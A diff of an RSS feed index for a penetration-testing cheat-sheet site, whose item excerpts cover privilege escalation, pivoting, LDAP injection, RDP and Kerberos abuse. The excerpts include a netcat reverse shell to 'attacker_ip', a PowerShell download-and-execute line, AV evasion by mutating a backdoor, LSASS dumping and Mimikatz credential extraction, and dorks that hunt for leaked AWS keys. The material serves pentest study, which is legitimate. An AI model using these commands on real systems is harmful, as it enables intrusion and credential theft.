@@ -135,8 +135,7 @@ ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. #
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/local-and-physical/local_recon_enumeration/</guid>
-      <description>Basics whoami ipconfig type “C:\Documents and Settings\Administrator\Desktop\proof.txt” echo %username% echo %path% ipconfig /all netstat -ano # Display hidden files dir /a # Recursive dir dir /s # Available ? Ok drop jaws enum tool ! powershell “$var=1” # Possible ? Ok drop windowsprivcheck.py &amp;#34;C:\Python2X\python.exe&amp;#34; -c &amp;#34;print &amp;#39;1&amp;#39;&amp;#34; # If x86 ? Drop windows-privesc-check.exe # You can use WinPrivCheck.bat to check common misconfigurations and KB https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat 
-Enumeration - Host Information # Exact OS version type C:/Windows/system32/eula.</description>
+      <description>Basics whoami ipconfig type “C:\Documents and Settings\Administrator\Desktop\proof.txt” echo %username% echo %path% ipconfig /all netstat -ano # Display hidden files dir /a # Recursive dir dir /s # Available ? Ok drop jaws enum tool ! powershell “$var=1” # Possible ? Ok drop windowsprivcheck.py &amp;#34;C:\Python2X\python.exe&amp;#34; -c &amp;#34;print &amp;#39;1&amp;#39;&amp;#34; # If x86 ? Drop windows-privesc-check.exe # You can use WinPrivCheck.bat to check common misconfigurations and KB https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat # If you can&amp;#39;t browse a folder because of space char # You can use an old trick cmd&amp;gt; cd progra~1</description>
     </item>
     
     <item>
@@ -212,7 +211,8 @@ Domain Configuration # First step is to buy a domain name # Ex : totallylegit.eu
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/network/pivot_techniques/</guid>
-      <description>Proxychains Pivot # When you have access to a machine, you can use it as pivot to target machines # Getting known machines arp -a # Setup SSH Dynamic on the attacking box ssh -D &amp;lt;local_port&amp;gt; &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt; # Setup proxychains in /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 &amp;lt;local_port&amp;gt; # Reduce timeout in /etc/proxychains.conf to gain speed tcp_read_time_out 800 tcp_connect_time-out 800 # Then proxychains...# If the compromised host is a Windows machine you still can use it as a pivot.</description>
+      <description>https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/
+Proxychains Pivot # When you have access to a machine, you can use it as pivot to target machines # Getting known machines arp -a # Setup SSH Dynamic on the attacking box ssh -D &amp;lt;local_port&amp;gt; &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt; # Setup proxychains in /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 &amp;lt;local_port&amp;gt; # Reduce timeout in /etc/proxychains.conf to gain speed tcp_read_time_out 800 tcp_connect_time-out 800 # Then proxychains...# Scanning (nmap) can be very long through proxychains # You can speed it up by using xargs and multithreading # The main goal is to spread ports between different threads (-P 50) $ seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.</description>
     </item>
     
     <item>
@@ -261,7 +261,7 @@ General and Tricks # Classical test &#39; or 1=1 LIMIT 1 -- &#39; or 1=1 LIMIT 1
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/system_tricks/</guid>
-      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure&amp;amp;m=128776663124692&amp;amp;w=2 
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure&amp;amp;m=128776663124692&amp;amp;w=2# Search for a binary privesc python3 gtfo -b systemctl 
 Recon and Enumeration # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=&amp;#34;/usr/bin&amp;#34;;system(&amp;#34;whoami&amp;#34;);’ → root # List processes running as root, permissions and NFS exports echo &amp;#39;services running as root&amp;#39;; ps aux | grep root; echo &amp;#39;permissions&amp;#39;; ps aux | awk &amp;#39;{print $11}&amp;#39;|xargs -r ls -la 2&amp;gt;/dev/null |awk &amp;#39;!</description>
     </item>
     
@@ -271,8 +271,8 @@ Recon and Enumeration # Look for strange process ps aux # Look for setuid progra
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/recon-enumeration/application-scans/web_application_scan/</guid>
-      <description>Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] 
-Whatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.monsite.com -a 1 # Stealhty $ whatweb www.</description>
+      <description>API Endpoints wordlist https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d  Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] 
+Whatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.</description>
     </item>
     
     <item>
@@ -455,16 +455,6 @@ MISC &amp;amp; Tricks # Show hidden options ./john --list=hidden-options # Using
       <guid>/network/ldap_dns/</guid>
       <description>LDAP Null Bind Enumeration # Syntax ldapsearch -h &amp;#34;LENOMDELAMACHINELDAP&amp;#34; -p &amp;#34;LEPORTSURLEQUELONYACCEDE&amp;#34; -x -b &amp;#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO&amp;#34; -v # Classic research ldapsearch -h challenge01.root-me.org -p 54013 -x -b &amp;#34;ou=anonymous,dc=challenge01,dc=root-me,dc=org&amp;#34; &amp;#34;cn=*&amp;#34; 
 DNS Zone Transfer # Zone transfer using dig dig @challenge01.root-me.org -p 54011 AXFR ch11.challenge01.root-me.org. # Zone transfer using nslookup nslookup -type=any &amp;gt; set port &amp;lt;port&amp;gt; &amp;gt; server challenge01.root-me.org &amp;gt; ch11.challenge01.root-me.org# Custom PERL zone transfer #!/usr/bin/env perl use warnings; use strict; use Net::DNS; # ici je teste rapidement si j&amp;#39;ai bien installe le module Net::DNS print Net::DNS-&amp;gt;version, &amp;#34;\n&amp;#34;; # creation de l&amp;#39;instance du resolveur maison.</description>
-    </item>
-    
-    <item>
-      <title>LSASS and Mimikatz</title>
-      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
-      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
-Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
     </item>
     
     <item>
@@ -658,6 +648,16 @@ Reverse Shell # You must first log as admin # Then you must activate the PHP ext
       <guid>/web-attacks/server-side-injections/ldap/</guid>
       <description> Basic LDAP Injection # Classical request : (&amp;amp;(uid=)(userPassword=)) # So result is TRUE if uid AND userPassword are true # You can put ‘)’ in request to crash and see the request username : *)(|(uid=* password : ) → (&amp;amp;(uid=*)(|(uid=*)(userPassword=))) OR username=* password=*)(&amp;amp; → (&amp;amp;(uid=*)(userPassword=*)(&amp;amp;)) 
 Blind LDAP Injection # You have to find/imagine how is the request built # test using only a char → OK → request is (mail=*[texte]*) # You can try (mail=*)(sn=*) → )(sn= → OK # Then, the password attribute (mail=*)(password=*) → OK @*)(password=x → FALSE @*)(password=d → TRUE # You can the enumerate each char</description>
+    </item>
+    
+    <item>
+      <title>LSASS and Mimikatz</title>
+      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
     </item>
     
     <item>
@@ -872,7 +872,7 @@ MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;user
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.</description>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.</description>
     </item>
     
     <item>
@@ -899,7 +899,7 @@ MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;user
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/passcracking-hashfiles/wordlists/</guid>
-      <description>Resources https://github.com/kaonashi-passwords/Kaonashi https://github.com/tarraschk/richelieu https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt https://packetstormsecurity.com/Crackers/wordlists/page4/ http://www.gwicks.net/dictionaries.htm # ... 
+      <description>Resources https://github.com/kaonashi-passwords/Kaonashi https://github.com/tarraschk/richelieu https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt https://packetstormsecurity.com/Crackers/wordlists/page4/ http://www.gwicks.net/dictionaries.htm # SCADA Default Passwords http://www.critifence.com/default-password-database/ https://weakpass.com/ https://github.com/berzerk0/Probable-Wordlists 
 CeWL # CeWL allows you to build custom wordlists based on online resources # If you know that your target is target.com, you can parse web content to build lists # Can be time consuming # 5 levels of depth and minimum 7 char per word cewl -w customwordlist.txt -d 5 -m 7 www.sans.org # Also visit and parse other sites cewl -w customwordlist.</description>
     </item>
     
@@ -999,7 +999,18 @@ Exploiting crontab # If a script is running with higher privileges echo &amp;#34
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/exploitation/kerberos/</guid>
-      <description>General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC)</description>
+      <description>https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC)</description>
+    </item>
+    
+    <item>
+      <title>PrivExchange</title>
+      <link>/windows-systems/privilege-escalation/privexchange/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/privexchange/</guid>
+      <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access 
+Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
     </item>
     
     <item>
@@ -1036,7 +1047,8 @@ PoC and enumeration # It is possible to prove the vulnerability by reading local
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/php-vulnerabilities/tricks_others/</guid>
-      <description>Bypass PHP disable_functions and open_basedir # PHP in Linux calls a binary (sendmail) when the mail() function is executed. # If we have putenv() allowed, we can set the environment variable &amp;#34;LD_PRELOAD&amp;#34;, so we can # preload an arbitrary shared object. Our shared object will execute our custom # payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example. # Chankro tool is used for that (https://github.</description>
+      <description>Code auditing / Looking for vulnerabilities https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet 
+Bypass PHP disable_functions and open_basedir # PHP in Linux calls a binary (sendmail) when the mail() function is executed. # If we have putenv() allowed, we can set the environment variable &amp;#34;LD_PRELOAD&amp;#34;, so we can # preload an arbitrary shared object. Our shared object will execute our custom # payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.</description>
     </item>
     
     <item>
@@ -1103,7 +1115,7 @@ NanoCMS # Password and sensitive data leak [url]/data/pagesdata.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/exploitation/rdp_exploitation/</guid>
-      <description>Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable 
+      <description>Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable# RDP through Pass-the-Hash xfreerdp /u:user /pth:&amp;lt;hash&amp;gt; /v:x.x.x.x 
 cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable</description>
     </item>
     
@@ -1162,7 +1174,7 @@ Deblurring images # Gaussian Blur # Install GIMP Plugin &amp;#34;G&amp;#39;MIC&a
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/misc_others/</guid>
-      <description>Table of Content  MISC Hidden Parameters Apache Server Status Command Injection Server Side Template Injection (SSTI) Image Tragick Shellshock Heartbleed  
+      <description>Table of Content  MISC IDOR Hidden Parameters Apache Server Status Command Injection Server Side Template Injection (SSTI) Image Tragick Shellshock Heartbleed  
 MISC # Install files # You can check for backup files using the following extensions .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .tmp, .txt, .back, .bkp, .bac, .tar, .gz, .tar.gz, .zip, .rar # Check headers # They often give informations curl -v &amp;lt;target&amp;gt; # Test for others HTTP methods (verb tampering) # Bypass .</description>
     </item>
     
@@ -1221,8 +1233,7 @@ Exploitng Host-Manager https://www.certilience.fr/2019/03/variante-d-exploitatio
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/misc/</guid>
-      <description>Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json 
-Wayback Machine (https://archive.org/web/) # You can also uses as CLI tool https://github.</description>
+      <description>Secrets # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com “apikey” site:http://ideone.com “aws_access_key_id” Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.</description>
     </item>
     
     <item>
